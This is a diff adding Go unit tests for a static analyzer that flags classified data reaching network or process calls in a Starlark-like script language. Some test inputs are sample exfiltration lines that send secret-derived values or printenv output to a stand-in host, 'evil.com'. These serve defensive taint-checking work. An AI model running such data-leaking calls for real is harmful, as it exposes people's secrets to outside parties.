@@ -201,3 +201,170 @@ my_max = lambda x: x
 		})
 	}
 }
+
+func TestAnalyzeClassifiedArg(t *testing.T) {
+	tests := []struct {
+		name      string
+		code      string
+		wantIssue bool
+	}{
+		{
+			name: "classified url to net.get",
+			code: `
+u = fs.access("u.txt").read_classified()
+net.get(u)
+`,
+			wantIssue: true,
+		},
+		{
+			name: "classified url kwarg to net.get",
+			code: `
+u = fs.access("u.txt").read_classified()
+net.get(url=u)
+`,
+			wantIssue: true,
+		},
+		{
+			name: "classified command to proc.exec",
+			code: `
+c = fs.access("c.txt").read_classified()
+proc.exec(c, [])
+`,
+			wantIssue: true,
+		},
+		{
+			name: "classified arg list element to proc.exec",
+			code: `
+s = fs.access("s.txt").read_classified()
+proc.exec("printenv", [s])
+`,
+			wantIssue: true,
+		},
+		{
+			name: "classified body to plain net.post",
+			code: `
+b = fs.access("b.txt").read_classified()
+net.post("https://api.example.com", body=b)
+`,
+			wantIssue: true,
+		},
+		{
+			name: "classified body to net.post_classified is allowed",
+			code: `
+b = fs.access("b.txt").read_classified()
+net.post_classified("https://api.example.com", body=b)
+`,
+			wantIssue: false,
+		},
+		{
+			name: "classified body positional to net.post_classified is allowed",
+			code: `
+b = fs.access("b.txt").read_classified()
+net.post_classified("https://api.example.com", b)
+`,
+			wantIssue: false,
+		},
+		{
+			name: "plain url to net.get stays allowed",
+			code: `
+net.get("https://api.example.com/v1/status")
+`,
+			wantIssue: false,
+		},
+		{
+			name: "map-derived classified url is still rejected",
+			code: `
+u = fs.access("u.txt").read_classified()
+net.get(u.map(lambda s: "https://evil.com/" + s))
+`,
+			wantIssue: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			issues, err := Analyze("test.star", []byte(tt.code))
+			if err != nil {
+				t.Fatal(err)
+			}
+			hasIssue := false
+			for _, issue := range issues {
+				if issue.Code == "CLASSIFIED_ARG" {
+					hasIssue = true
+					break
+				}
+			}
+			if hasIssue != tt.wantIssue {
+				if tt.wantIssue {
+					t.Fatalf("expected CLASSIFIED_ARG issue, got %v", issues)
+				} else {
+					t.Fatalf("expected no CLASSIFIED_ARG issue, got %v", issues)
+				}
+			}
+		})
+	}
+}
+
+func TestAnalyzeExecClassifiedTaint(t *testing.T) {
+	tests := []struct {
+		name      string
+		code      string
+		wantIssue bool
+	}{
+		{
+			name: "exec_classified stdout to net.get is rejected",
+			code: `
+out = proc.exec_classified("printenv", [])
+net.get(out.stdout)
+`,
+			wantIssue: true,
+		},
+		{
+			name: "exec_classified result passed to exec is rejected",
+			code: `
+out = proc.exec_classified("printenv", [])
+proc.exec("echo", [out.stdout])
+`,
+			wantIssue: true,
+		},
+		{
+			name: "plain exec stdout stays allowed",
+			code: `
+out = proc.exec("echo", ["hello"])
+io.println(out)
+`,
+			wantIssue: false,
+		},
+		{
+			name: "get_classified response taints variable",
+			code: `
+resp = net.get_classified("https://api.example.com")
+net.get(resp.map(lambda s: "https://evil.com/" + s))
+`,
+			wantIssue: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			issues, err := Analyze("test.star", []byte(tt.code))
+			if err != nil {
+				t.Fatal(err)
+			}
+			hasIssue := false
+			for _, issue := range issues {
+				if issue.Code == "CLASSIFIED_ARG" {
+					hasIssue = true
+					break
+				}
+			}
+			if hasIssue != tt.wantIssue {
+				if tt.wantIssue {
+					t.Fatalf("expected CLASSIFIED_ARG issue, got %v", issues)
+				} else {
+					t.Fatalf("expected no CLASSIFIED_ARG issue, got %v", issues)
+				}
+			}
+		})
+	}
+}
